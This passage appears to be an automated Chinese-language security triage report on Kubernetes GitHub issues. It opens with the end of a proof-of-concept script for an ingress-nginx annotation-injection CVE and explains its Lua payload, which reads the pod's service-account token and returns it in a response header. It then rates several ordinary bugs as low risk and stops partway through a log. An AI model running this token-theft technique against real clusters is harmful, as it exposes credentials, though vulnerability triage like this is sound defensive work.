            # 3. If IP/Hostname obtained, send request and check for leak
            if target and not stop_event.is_set():
                # Add a small delay for Nginx config reload
                print("[*] Waiting a few seconds for nginx config reload...")
                time.sleep(10)
                test_exploit(target)
            elif not target:
                print("[!] Could not obtain Ingress IP/Hostname. Cannot test exploit.", file=sys.stderr)

    except Exception as e:
        print(f"[!] An unexpected error occurred in main execution: {e}", file=sys.stderr)
    finally:
        # 4. Cleanup
        cleanup()
        signal.alarm(0) # Disable the alarm
        print("[*] PoC script finished.")

# Call the main function directly as per requirements
main()
```


**解释说明：**

1.  **目的**: 该脚本旨在通过创建一个恶意的 Kubernetes Ingress 资源来演示 CVE-2025-24514 漏洞。该漏洞允许通过 `nginx.ingress.kubernetes.io/auth-url` 注解注入 Nginx 配置。
2.  **工作流程**:
    *   **配置加载**: 脚本首先尝试从默认位置 (`~/.kube/config` 或 KUBECONFIG 环境变量指定的位置) 加载 Kubernetes 集群的连接配置。
    *   **虚拟认证服务器**: 在本地启动一个简单的 HTTP 服务器 (`run_dummy_auth_server`)，监听在 `AUTH_SERVER_PORT` (10888) 端口。这个服务器仅用于作为 `auth-url` 的目标，实际的漏洞利用不依赖于该服务器的响应，而是依赖于 `auth-url` 字符串本身被不安全地插入 Nginx 配置中。服务器会简单地返回 401 未授权。
    *   **恶意 Ingress 创建**:
        *   定义一个 Ingress 对象的 Python 字典 (`create_malicious_ingress`)。
        *   关键在于 `metadata.annotations` 中的 `nginx.ingress.kubernetes.io/auth-url`。这里包含了一个精心构造的字符串 (`PAYLOAD`)。
        *   `PAYLOAD` 试图利用 Nginx 配置模板处理注解值时可能存在的缺陷（如未正确处理换行符或特殊字符），注入一个 Lua 代码块 (`lua_block {...}`). **注意**: 这依赖于目标 ingress-nginx 控制器已启用 Lua 模块。
        *   注入的 Lua 代码尝试打开并读取运行 Pod 的 Service Account 令牌文件 (`/var/run/secrets/kubernetes.io/serviceaccount/token`)，然后将令牌内容设置到一个自定义的 HTTP 响应头 `X-Leaked-Token` 中。如果读取失败，则设置一个错误标识。
        *   使用 `kubernetes` Python 库将这个 Ingress 对象创建在指定的 `NAMESPACE` (默认为 "default") 中。
    *   **获取 Ingress IP**: 脚本会轮询 (`get_ingress_ip`) 等待 Kubernetes 将一个外部可访问的 IP 地址或主机名分配给新创建的 Ingress 资源。这是访问被注入配置的 Nginx 实例所必需的。
    *   **漏洞验证**:
        *   一旦获取到 IP 或主机名 (`target`)，脚本会等待一小段时间，让 ingress-nginx 控制器有时间检测到新的 Ingress 对象并更新其内部的 Nginx 配置。
        *   然后，脚本使用 `requests` 库向 Ingress 的地址发送一个 HTTP GET 请求 (`test_exploit`)。请求中包含 `Host` 头，以匹配 Ingress 规则中定义的域名 (`poc-ingress-cve-2025-24514.example.com`)。
        *   脚本检查收到的 HTTP 响应头。如果响应头中存在 `X-Leaked-Token`，无论其值是实际的令牌还是错误信息，都表明配置注入成功，因为这个头是恶意注入的 Lua 代码添加的。脚本会打印出部分泄露的令牌（如果成功读取）或确认配置注入成功。
    *   **清理**: 无论成功与否，脚本最终会尝试删除创建的恶意 Ingress 资源 (`cleanup`)，并停止本地的虚拟认证服务器。
    *   **超时与错误处理**: 脚本包含一个总执行超时 (`TIMEOUT_SECONDS`)，以及针对 K8s API 调用、网络请求和服务器启动的错误处理。
3.  **运行前提**:
    *   本地安装了 Python 3 及 `kubernetes`, `requests` 库 (`pip install kubernetes requests`)。
    *   拥有访问目标 Kubernetes 集群的 `kubeconfig` 文件，并且该配置具有在目标命名空间 (`default`) 中创建和删除 Ingress 资源的权限。
    *   目标集群中运行着受 CVE-2025-24514 影响的 `ingress-nginx` 版本，且未启用 `enable-annotation-validation`。
    *   目标 `ingress-nginx` 控制器需要启用了 Lua 模块，以便 PoC 中的 Lua Payload 能够执行。（如果未启用 Lua，则需要修改 `PAYLOAD` 为其他不依赖 Lua 的 Nginx 配置注入方式，但这更复杂且依赖具体的 Nginx 配置模板细节）。
    *   脚本运行环境需要能够访问到 Kubernetes API Server 和分配给 Ingress 的 IP/主机名。
4.  **安全性**: 此脚本仅用于教育目的和在授权环境中测试漏洞。获取到的 Service Account 令牌可能具有敏感权限，请勿在生产环境或未经授权的系统上运行此脚本。

---


# ⚠️ 存在低风险的 Issues (13 个)

## Issue #131115 Kubelet can host "phantom" pod upon etcd restore.

- Issue 链接：[#131115](https://github.com/kubernetes/kubernetes/issues/131115)

### Issue 内容

#### What happened?

Hi, we found a situation similar to https://github.com/kubernetes/kubernetes/issues/115325, while caused by etcd being restored to a previous snapshot, which "erased" a created pod.

Kubelet complains resource problem and fails newly scheduled pods, as if the original pod is still there (well, it is).

#### What did you expect to happen?

Kubelet should have some warning and ideally reconnect to apiserver and remove the "phantom" pod as a orphaned pod.

#### How can we reproduce it (as minimally and precisely as possible)?

See https://github.com/tdihp/myakshack/tree/main/repros/phantompod for a tested working repro, while to describe on how to reproduce this in simple words:

1. take a etcd backup
2. provision a pod until it is running in kubelet
3. take etcd down, and restore it to backup
4. restart etcd, kube-apiserver, kube-controller-manager and kube-scheduler, notice kubelet isn't restarted.
5. The pod will be gone, while will be running if we do crictl on the node.


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

Tested across v1.29 ~ 1.32

</details>


#### Cloud provider

<details>
Not relevant, but might impact any cloud provider that restores ETCD.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
1.  **问题描述:** 该 Issue 描述了一个在 etcd 从备份恢复后可能出现的问题。当 etcd 恢复到一个 Pod 已经被调度到 Kubelet 运行之前的快照状态时，API Server 会失去该 Pod 的记录。然而，如果 Kubelet 没有被重启，它会继续运行这个 Pod（称为 "phantom" pod），并认为该 Pod 仍在消耗节点资源。
2.  **潜在影响:**
    *   **资源占用:** "phantom" pod 持续在节点上运行并占用 CPU、内存等资源。
    *   **调度失败 (DoS):** 由于 Kubelet 认为节点资源已被 "phantom" pod 占用，当新的 Pod 需要被调度到该节点时，Kubelet 可能会因为资源不足（如 CPU、内存不足）而拒绝接收，导致新 Pod 调度失败。这构成了对该节点资源的拒绝服务（Denial of Service）。
    *   **状态不一致:** 集群的控制平面（API Server/etcd）与节点（Kubelet）的状态不一致，控制平面认为节点有可用资源，而 Kubelet 认为资源已被占用。
3.  **风险分析:**
    *   该问题本质上是一个状态不一致导致的资源可用性问题，可以看作是一种拒绝服务（DoS）。新 Pod 无法调度到受影响的节点上。
    *   **触发条件:** 触发此问题需要非常高的权限和复杂的操作：
        *   能够访问 etcd 并执行备份和恢复操作。
        *   能够重启控制平面组件（kube-apiserver, kube-controller-manager, kube-scheduler）而不重启 Kubelet。
        *   需要精确的时间窗口（在 Pod 创建运行后备份，在 etcd 恢复前 Pod 仍在运行）。
    *   **CVSS 3.1 评估:**
        *   **Attack Vector (AV): Network** (假设 etcd 操作和组件重启通过网络管理接口进行)
        *   **Attack Complexity (AC): High** (需要 etcd 访问、精确时机和控制平面重启能力)
        *   **Privileges Required (PR): High** (需要集群管理员级别的权限来操作 etcd 和控制平面)
        *   **User Interaction (UI): None**
        *   **Scope (S): Unchanged** (影响局限于集群内部的调度和节点资源)
        *   **Confidentiality (C): None**
        *   **Integrity (I): None** (主要是状态不一致，而非数据篡改)
        *   **Availability (A): Low** (影响单个或少数节点的 Pod 调度能力，而非整个集群的瘫痪)
        *   根据 CVSS 3.1 计算器，`CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:L` 得分约为 2.2 (Low)。
    *   **根据风险判断标准:**
        *   标准 3：CVSS 评分低于 high (7.0)，应判断为低风险。
        *   标准 5：该 DoS 需要攻击者具备高权限（etcd 恢复、控制平面重启），明确指出 "当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下"。此情况完全符合，因此不应判断为高风险。
        *   标准 7 & 8：问题不涉及命令执行、提权、容器逃逸或低权限用户影响其他用户的情况。

4.  **结论:** 该问题虽然会导致节点资源不可用和调度失败，但触发条件苛刻，需要极高的管理员权限。根据 CVSS 评分和特定的 DoS 降级规则（标准 5），此问题应被评为低风险。

**复现过程：**

```python
# 根据风险判断标准，此 Issue 被评定为“低风险”。
# 标准要求仅针对“高风险”问题提供复现脚本。
# 因此，不为此低风险问题提供复现脚本。

print("该 Issue 被评定为低风险，无需提供复现脚本。")
print("复现此问题需要高权限操作（etcd 备份恢复、控制平面重启），难以通过普通脚本模拟。")
print("具体手动复现步骤请参考 Issue 内容中的描述和链接：")
print("https://github.com/tdihp/myakshack/tree/main/repros/phantompod")

def main():
    print("执行完毕。")

# 直接调用 main 函数
main()
```


**解释说明：**

该 Issue 描述的问题被评估为低风险。主要原因是：

1.  **权限要求高:** 复现该问题需要集群管理员级别的权限，能够对 etcd 进行备份和恢复，并能控制性地重启控制平面组件。这大大降低了实际被恶意利用的可能性。
2.  **影响范围有限:** 问题主要影响单个节点的 Pod 调度能力，导致部分资源不可用（DoS），但通常不会导致整个集群瘫痪或数据泄露、权限提升等严重后果。
3.  **符合降级标准:** 根据提供的风险判断标准第 5 条，对于需要高权限才能触发的 DoS 攻击，不应判断为高风险。

由于该问题不属于高风险类别，按照要求，无需提供 Python 复现脚本。提供的 Python 代码片段仅用于说明此情况，并指引用户参考 Issue 中给出的手动复现步骤。手动复现涉及复杂的基础设施操作（如 etcd 备份/恢复），难以在简单的 Python 脚本中完全自动化和模拟。

---


## Issue #131045 Field name mismatch in PVC status validation

- Issue 链接：[#131045](https://github.com/kubernetes/kubernetes/issues/131045)

### Issue 内容

https://github.com/kubernetes/kubernetes/blob/ff25881bc1fe9da1dda4ec82d294b92078ae2763/pkg/apis/core/validation/validation.go#L2542

In this line, the field is set to "allocatedResourceStatus", but the PersistentVolumeClaimStatus class declares it as "AllocatedResourceStatuses"(consistent with the documentation). I'm unsure why "allocatedResourceStatus" is used here.Is this a typo, or is there a mapping logic we're missing?

### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该 Issue 指出了 Kubernetes 代码中 `pkg/apis/core/validation/validation.go` 文件 L2542 行处的一个字段名不匹配问题。具体来说，在验证 `PersistentVolumeClaimStatus`（PVC 状态）时，代码中用于生成错误路径的字段名是 `"allocatedResourceStatus"`，而 `PersistentVolumeClaimStatus` 结构体中定义的（以及文档中记录的）实际字段名是 `"AllocatedResourceStatuses"`（注意末尾的 'es'）。

潜在影响分析：
1.  **错误信息不准确**：如果涉及 `AllocatedResourceStatuses` 字段的验证失败，API 服务器返回给用户的错误信息中，字段路径（field path）将指向一个不存在的字段 (`status.allocatedResourceStatus`)，而不是实际存在问题的字段 (`status.allocatedResourceStatuses`)。这会给用户诊断问题带来困惑。
2.  **验证逻辑可能失效**：更严重的情况是，如果验证逻辑依赖于这个错误的字段名来查找或操作数据，那么对 `AllocatedResourceStatuses` 字段的验证可能完全没有按预期执行。这可能导致：
    *   **接受无效状态**：包含无效 `AllocatedResourceStatuses` 数据的 PVC 状态更新请求可能被错误地接受。这可能导致后续依赖此状态的控制器（如调度器、特定 CSI 驱动控制器等）行为异常，可能影响资源分配、调度决策或存储功能。
    *   **拒绝有效状态（可能性较低）**：如果验证逻辑因为找不到 `allocatedResourceStatus` 而意外失败，可能会拒绝本应有效的 PVC 状态更新。

安全风险评估：
*   **机密性（Confidentiality）**：此问题不太可能导致信息泄露。
*   **完整性（Integrity）**：如果验证逻辑失效导致接受了无效的 `AllocatedResourceStatuses` 状态，这会破坏集群状态的完整性，但主要是功能层面的，而非直接的安全篡改。攻击者无法利用此缺陷直接修改任意数据或提升权限。影响范围主要局限于与该 PVC 相关的资源管理和调度。
*   **可用性（Availability）**：
    *   如果导致拒绝有效请求，则构成一种拒绝服务（DoS），阻止用户或控制器更新 PVC 状态。
    *   如果导致接受无效状态，可能引起控制器异常，间接影响相关 Pod 的调度或存储卷的可用性，也可能构成一种 DoS。
    *   根据风险判断标准 #5，这种 DoS 通常需要攻击者具备修改 PVC 或其状态的权限（通常是集群管理员或特定的控制器服务账户，普通用户通常只能创建/修改 PVC spec 而非 status）。因此，即使发生 DoS，其利用条件也相对较高，不应评为高风险。
*   **命令执行/提权/容器逃逸**：该问题与这些高风险漏洞类型无关。
*   **多用户影响**：一个用户（或控制器）触发此问题主要影响与其自身相关的 PVC 和工作负载，不太可能直接跨越权限边界影响其他用户。

结论：这是一个代码正确性问题（很可能是 typo），其主要影响是功能性的，可能导致验证逻辑不正确、错误信息误导，以及潜在的低级别可用性（DoS）或完整性（集群状态不一致）问题。它不满足高风险漏洞的条件。

**复现过程：**

```python
# 此问题是一个代码级别的字段名拼写错误，影响的是 API 服务器内部的验证逻辑和错误报告。
# 它通常在特定控制器（如 CSI 驱动相关控制器）更新 PVC Status 时，
# 且相关特性（如 VolumeAttributesClass）被使用时才可能被触发。
# 编写一个通用的、能在任意集群稳定复现此问题的 POC 非常困难，因为它依赖于：
# 1. 集群中是否启用了依赖 `AllocatedResourceStatuses` 字段的相关特性。
# 2. 是否有控制器会尝试填充并触发此字段的验证逻辑。
# 3. 验证逻辑的具体实现（该字段名的错误是否真的导致验证跳过或失败）。
#
# 直接通过标准的 PVC 创建/更新操作很难触发 status 部分的这个特定验证路径。
# 通常需要模拟控制器行为或直接 Patch PVC status（需要高权限）。
#
# 由于该问题风险评级为“低风险”，且复现条件复杂、不直接可利用，
# 同时主要影响是验证逻辑和错误信息准确性，而非引入严重安全漏洞，
# 因此不提供具体的复现 POC 脚本。
#
# 验证此问题的最佳方式是通过代码审计（Issue 本身就是这么发现的）
# 或在启用相关特性的 Kubernetes 开发/测试环境中，
# 构造特定的 PVC 状态更新请求（可能需要直接调用 API Patch status 子资源），
# 并观察 API Server 返回的错误信息中的字段路径是否错误，
# 或者观察是否能提交包含无效 AllocatedResourceStatuses 数据的状态。

print("该 Issue 指出的问题是 Kubernetes 源代码中的一个字段名拼写错误。")
print("这是一个低风险的代码正确性问题，主要影响验证逻辑和错误报告的准确性。")
print("由于复现条件复杂且依赖特定集群配置和控制器行为，并且风险等级较低，因此不提供自动化复现 POC。")
print("验证建议通过代码审查或在特定测试环境中手动构造请求进行。")
```


**解释说明：**

上述 Python 代码并未实现真正的复现逻辑。原因如下：

1.  **问题性质**：该 Issue 指出的核心问题是 Kubernetes API 服务器源代码中验证逻辑的一部分使用了错误的字段名字符串 (`allocatedResourceStatus` 而非 `AllocatedResourceStatuses`) 来构建错误路径。这是一个静态的代码缺陷。
2.  **复现难度**：要实际触发这个错误的验证路径并观察其影响（例如，收到路径错误的验证错误，或者发现验证被跳过），需要满足特定条件：
    *   相关的 Kubernetes 特性（可能涉及 `VolumeAttributesClass` 或类似功能）必须被启用。
    *   必须有一个操作（通常来自某个控制器，而不是普通用户创建 PVC）尝试去更新 PVC 的 `status.allocatedResourceStatuses` 字段。
    *   更新的数据需要能够触发该验证逻辑（例如，格式错误或内容无效）。
    *   直接通过用户创建或修改 PVC `spec` 的标准流程通常不会直接设置或验证 `status.allocatedResourceStatuses`。可能需要通过 `PATCH` 请求直接修改 PVC 的 `status` 子资源，这需要较高的权限。
3.  **风险评级**：如分析内容所述，该问题被评为“低风险”。它主要是代码质量和功能正确性问题，潜在的 DoS 或完整性影响有限，且利用条件较高，不满足提供强制性 POC 的高风险标准。
4.  **POC 价值**：即使能够构造一个复杂的场景来触发这个问题，其结果也仅仅是证明了代码中确实存在这个拼写错误（这通过代码本身就能确认），或者观察到错误的错误信息路径/可能失效的验证。这对于证明一个低风险的功能性 bug 来说，编写通用 POC 的投入产出比较低。

因此，脚本仅打印解释性信息，说明了问题的性质、复现的困难以及不提供实际 POC 的理由。修复这个问题需要直接修改 Kubernetes 源代码中指出的那一行。

---


## Issue #131044 resourceClaimTemplate in Pod.Spec is changed to nil when the manifest is submitted to api-server

- Issue 链接：[#131044](https://github.com/kubernetes/kubernetes/issues/131044)

### Issue 内容

#### What happened?

I set the dra feature-gate to true in kube-apiserver, kube-controller-manager, kubelet and kube-scheduler. and set the runtime-config to `api/all` for the api-server.

- kube-apiserver:

```
    - --feature-gates=DynamicResourceAllocation=true
    - --runtime-config=api/all=true
```

- kube-controller-manager, kube-scheduler:

```
    - --feature-gates=DynamicResourceAllocation=true
```

I created the daemonset and configure the resourceClaims in pod.spec, see below:

```
      resourceClaims:
      - name: demo-static
        resourceClaimTemplateName: demo-static
```

and I submitted the daemonset.yaml:

```
~# kubectl apply -f daemonset.yaml -v 9
...
I0325 11:48:28.411463 3206159 round_trippers.go:584] Response Headers:
I0325 11:48:28.411497 3206159 round_trippers.go:587]     Cache-Control: no-cache, private
I0325 11:48:28.411507 3206159 round_trippers.go:587]     Content-Type: application/json
I0325 11:48:28.411524 3206159 round_trippers.go:587]     X-Kubernetes-Pf-Flowschema-Uid: c170b105-c632-487e-800c-2b7e48b70984
I0325 11:48:28.411538 3206159 round_trippers.go:587]     X-Kubernetes-Pf-Prioritylevel-Uid: b1672c8d-17a9-49ac-858a-633e8682d346
I0325 11:48:28.411551 3206159 round_trippers.go:587]     Date: Tue, 25 Mar 2025 03:48:28 GMT
I0325 11:48:28.411563 3206159 round_trippers.go:587]     Audit-Id: c04dd822-6db2-4bed-869b-e525ee85d59d
I0325 11:48:28.411977 3206159 helper.go:105] "Response Body" body=<
	{"kind":"DaemonSet","apiVersion":"apps/v1","metadata":{"name":"demo-dra","namespace":"default","uid":"7ff48efd-fdfe-40a6-816a-b371b8ecce43","resourceVersion":"164918541","generation":1,"creationTimestamp":"2025-03-25T02:20:02Z","annotations":{"deprecated.daemonset.template.generation":"1","kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"apps/v1\",\"kind\":\"DaemonSet\",\"metadata\":{\"annotations\":{},\"name\":\"demo-dra\",\"namespace\":\"default\"},\"spec\":{\"revisionHistoryLimit\":10,\"selector\":{\"matchLabels\":{\"app\":\"rdma-test-gpu-tool\"}},\"template\":{\"metadata\":{\"labels\":{\"app\":\"rdma-test-gpu-tool\"}},\"spec\":{\"containers\":[{\"env\":[{\"name\":\"ENV_POD_NAME\",\"valueFrom\":{\"fieldRef\":{\"apiVersion\":\"v1\",\"fieldPath\":\"metadata.name\"}}},{\"name\":\"ENV_LOCAL_NODE_IP\",\"valueFrom\":{\"fieldRef\":{\"apiVersion\":\"v1\",\"fieldPath\":\"status.hostIP\"}}},{\"name\":\"ENV_LOCAL_NODE_NAME\",\"valueFrom\":{\"fieldRef\":{\"apiVersion\":\"v1\",\"fieldPath\":\"spec.nodeName\"}}},{\"name\":\"ENV_SERVICE_NAME\",\"value\":\"rdma-test-gpu-tool\"},{\"name\":\"ENV_POD_NAMESPACE\",\"valueFrom\":{\"fieldRef\":{\"apiVersion\":\"v1\",\"fieldPath\":\"metadata.namespace\"}}}],\"image\":\"ghcr.m.daocloud.io/spidernet-io/rdma-tools:12.5.1-898cf75813bf866d1ba576ce7484065c0fd237e8\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"rdma-test\",\"ports\":[{\"containerPort\":22,\"name\":\"ssh\",\"protocol\":\"TCP\"}],\"readinessProbe\":{\"exec\":{\"command\":[\"sh\",\"-c\",\"ls /tmp/ready\"]},\"failureThreshold\":3,\"periodSeconds\":10,\"successThreshold\":1,\"timeoutSeconds\":1}}],\"resourceClaims\":[{\"name\":\"demo-static\",\"resourceClaimTemplateName\":\"demo-static\"}]}}}}\n"},"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"apps/v1","time":"2025-03-25T02:20:02Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:desiredNumberScheduled":{},"f:numberUnavailable":{},"f:observedGeneration":{}}},"subresource":"status"},{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"apps/v1","time":"2025-03-25T02:20:02Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:deprecated.daemonset.template.generation":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:spec":{"f:revisionHistoryLimit":{},"f:selector":{},"f:template":{"f:metadata":{"f:labels":{".":{},"f:app":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"rdma-test\"}":{".":{},"f:env":{".":{},"k:{\"name\":\"ENV_LOCAL_NODE_IP\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"ENV_LOCAL_NODE_NAME\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"ENV_POD_NAME\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"ENV_POD_NAMESPACE\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"ENV_SERVICE_NAME\"}":{".":{},"f:name":{},"f:value":{}}},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:ports":{".":{},"k:{\"containerPort\":22,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}}},"f:readinessProbe":{".":{},"f:exec":{".":{},"f:command":{}},"f:failureThreshold":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:dnsPolicy":{},"f:resourceClaims":{".":{},"k:{\"name\":\"demo-static\"}":{".":{},"f:name":{},"f:resourceClaimTemplateName":{}}},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{}}},"f:updateStrategy":{"f:rollingUpdate":{".":{},"f:maxSurge":{},"f:maxUnavailable":{}},"f:type":{}}}}}]},"spec":{"selector":{"matchLabels":{"app":"rdma-test-gpu-tool"}},"template":{"metadata":{"creationTimestamp":null,"labels":{"app":"rdma-test-gpu-tool"}},"spec":{"containers":[{"name":"rdma-test","image":"ghcr.m.daocloud.io/spidernet-io/rdma-tools:12.5.1-898cf75813bf866d1ba576ce7484065c0fd237e8","ports":[{"name":"ssh","containerPort":22,"protocol":"TCP"}],"env":[{"name":"ENV_POD_NAME","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"metadata.name"}}},{"name":"ENV_LOCAL_NODE_IP","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"status.hostIP"}}},{"name":"ENV_LOCAL_NODE_NAME","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"spec.nodeName"}}},{"name":"ENV_SERVICE_NAME","value":"rdma-test-gpu-tool"},{"name":"ENV_POD_NAMESPACE","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}}],"resources":{},"readinessProbe":{"exec":{"command":["sh","-c","ls /tmp/ready"]},"timeoutSeconds":1,"periodSeconds":10,"successThreshold":1,"failureThreshold":3},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","securityContext":{},"schedulerName":"default-scheduler","resourceClaims":[{"name":"demo-static","resourceClaimTemplateName":"demo-static"}]}},"updateStrategy":{"type":"RollingUpdate","rollingUpdate":{"maxUnavailable":1,"maxSurge":0}},"revisionHistoryLimit":10},"status":{"currentNumberScheduled":0,"numberMisscheduled":0,"desiredNumberScheduled":2,"numberReady":0,"observedGeneration":1,"numberUnavailable":2}}
```

I saw the resourceClaimTemplateName is demo-static from the response body. but I saw the value is nil in my webhook logs:

```
{"level":"DEBUG","ts":"2025-03-25T03:40:39.801Z","logger":"PodMutating","caller":"podmanager/pod_webhook.go:78","msg":"Request Pod: {TypeMeta:{Kind:Pod APIVersion:v1} ObjectMeta:{Name: GenerateName:demo-dra- Namespace:default SelfLink: UID: ResourceVersion: Generation:0 CreationTimestamp:0001-01-01 00:00:00 +0000 UTC DeletionTimestamp:<nil> DeletionGracePeriodSeconds:<nil> Labels:map[app:rdma-test-gpu-tool controller-revision-hash:9585d45 pod-template-generation:1] Annotations:map[] OwnerReferences:[{APIVersion:apps/v1 Kind:DaemonSet Name:demo-dra UID:7ff48efd-fdfe-40a6-816a-b371b8ecce43 Controller:0xc001ee21f8 BlockOwnerDeletion:0xc001ee21f9}] Finalizers:[] ManagedFields:[{Manager:kube-controller-manager Operation:Update APIVersion:v1 Time:2025-03-25 03:40:39 +0000 UTC FieldsType:FieldsV1 FieldsV1:{\"f:metadata\":{\"f:generateName\":{},\"f:labels\":{\".\":{},\"f:app\":{},\"f:controller-revision-hash\":{},\"f:pod-template-generation\":{}},\"f:ownerReferences\":{\".\":{},\"k:{\\\"uid\\\":\\\"7ff48efd-fdfe-40a6-816a-b371b8ecce43\\\"}\":{}}},\"f:spec\":{\"f:affinity\":{\".\":{},\"f:nodeAffinity\":{\".\":{},\"f:requiredDuringSchedulingIgnoredDuringExecution\":{}}},\"f:containers\":{\"k:{\\\"name\\\":\\\"rdma-test\\\"}\":{\".\":{},\"f:env\":{\".\":{},\"k:{\\\"name\\\":\\\"ENV_LOCAL_NODE_IP\\\"}\":{\".\":{},\"f:name\":{},\"f:valueFrom\":{\".\":{},\"f:fieldRef\":{}}},\"k:{\\\"name\\\":\\\"ENV_LOCAL_NODE_NAME\\\"}\":{\".\":{},\"f:name\":{},\"f:valueFrom\":{\".\":{},\"f:fieldRef\":{}}},\"k:{\\\"name\\\":\\\"ENV_POD_NAME\\\"}\":{\".\":{},\"f:name\":{},\"f:valueFrom\":{\".\":{},\"f:fieldRef\":{}}},\"k:{\\\"name\\\":\\\"ENV_POD_NAMESPACE\\\"}\":{\".\":{},\"f:name\":{},\"f:valueFrom\":{\".\":{},\"f:fieldRef\":{}}},\"k:{\\\"name\\\":\\\"ENV_SERVICE_NAME\\\"}\":{\".\":{},\"f:name\":{},\"f:value\":{}}},\"f:image\":{},\"f:imagePullPolicy\":{},\"f:name\":{},\"f:ports\":{\".\":{},\"k:{\\\"containerPort\\\":22,\\\"protocol\\\":\\\"TCP\\\"}\":{\".\":{},\"f:containerPort\":{},\"f:name\":{},\"f:protocol\":{}}},\"f:readinessProbe\":{\".\":{},\"f:exec\":{\".\":{},\"f:command\":{}},\"f:failureThreshold\":{},\"f:periodSeconds\":{},\"f:successThreshold\":{},\"f:timeoutSeconds\":{}},\"f:resources\":{},\"f:terminationMessagePath\":{},\"f:terminationMessagePolicy\":{}}},\"f:dnsPolicy\":{},\"f:enableServiceLinks\":{},\"f:resourceClaims\":{\".\":{},\"k:{\\\"name\\\":\\\"demo-static\\\"}\":{\".\":{},\"f:name\":{},\"f:resourceClaimTemplateName\":{}}},\"f:restartPolicy\":{},\"f:schedulerName\":{},\"f:securityContext\":{},\"f:terminationGracePeriodSeconds\":{},\"f:tolerations\":{}}} Subresource:}]} Spec:{Volumes:[{Name:kube-api-access-j7q2w VolumeSource:{HostPath:nil EmptyDir:nil GCEPersistentDisk:nil AWSElasticBlockStore:nil GitRepo:nil Secret:nil NFS:nil ISCSI:nil Glusterfs:nil PersistentVolumeClaim:nil RBD:nil FlexVolume:nil Cinder:nil CephFS:nil Flocker:nil DownwardAPI:nil FC:nil AzureFile:nil ConfigMap:nil VsphereVolume:nil Quobyte:nil AzureDisk:nil PhotonPersistentDisk:nil Projected:&ProjectedVolumeSource{Sources:[]VolumeProjection{VolumeProjection{Secret:nil,DownwardAPI:nil,ConfigMap:nil,ServiceAccountToken:&ServiceAccountTokenProjection{Audience:,ExpirationSeconds:*3607,Path:token,},ClusterTrustBundle:nil,},VolumeProjection{Secret:nil,DownwardAPI:nil,ConfigMap:&ConfigMapProjection{LocalObjectReference:LocalObjectReference{Name:kube-root-ca.crt,},Items:[]KeyToPath{KeyToPath{Key:ca.crt,Path:ca.crt,Mode:nil,},},Optional:nil,},ServiceAccountToken:nil,ClusterTrustBundle:nil,},VolumeProjection{Secret:nil,DownwardAPI:&DownwardAPIProjection{Items:[]DownwardAPIVolumeFile{DownwardAPIVolumeFile{Path:namespace,FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:metadata.namespace,},ResourceFieldRef:nil,Mode:nil,},},},ConfigMap:nil,ServiceAccountToken:nil,ClusterTrustBundle:nil,},},DefaultMode:*420,} PortworxVolume:nil ScaleIO:nil StorageOS:nil CSI:nil Ephemeral:nil Image:nil}}] InitContainers:[] Containers:[{Name:rdma-test Image:ghcr.m.daocloud.io/spidernet-io/rdma-tools:12.5.1-898cf75813bf866d1ba576ce7484065c0fd237e8 Command:[] Args:[] WorkingDir: Ports:[{Name:ssh HostPort:0 ContainerPort:22 Protocol:TCP HostIP:}] EnvFrom:[] Env:[{Name:ENV_POD_NAME Value: ValueFrom:&EnvVarSource{FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:metadata.name,},ResourceFieldRef:nil,ConfigMapKeyRef:nil,SecretKeyRef:nil,}} {Name:ENV_LOCAL_NODE_IP Value: ValueFrom:&EnvVarSource{FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:status.hostIP,},ResourceFieldRef:nil,ConfigMapKeyRef:nil,SecretKeyRef:nil,}} {Name:ENV_LOCAL_NODE_NAME Value: ValueFrom:&EnvVarSource{FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:spec.nodeName,},ResourceFieldRef:nil,ConfigMapKeyRef:nil,SecretKeyRef:nil,}} {Name:ENV_SERVICE_NAME Value:rdma-test-gpu-tool ValueFrom:nil} {Name:ENV_POD_NAMESPACE Value: 